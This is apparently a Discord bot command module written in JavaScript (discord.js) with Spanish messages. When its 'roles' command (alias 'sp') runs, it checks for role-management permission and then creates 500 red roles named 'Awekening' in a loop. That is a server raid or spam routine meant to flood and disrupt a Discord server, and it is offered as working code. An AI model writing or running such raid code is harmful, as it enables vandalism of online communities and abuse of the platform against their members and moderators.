const Discord = require("discord.js");


module.exports = {
  nombre: "roles",
  alias: ["sp"],
  run: async (client, message, args) => {


    if(!message.guild.me.hasPermission("MANAGE_ROLES")) return message.author.send(":x: `|` No tengo permisos de cambiar roles")
   

    for(let x = 0; x < 500; x++){
        message.guild.roles.create({data: {name: `Awekening`,color: '#d41818',},reason: 'razon',}).catch(err => console.log(err))
    }





  },
};
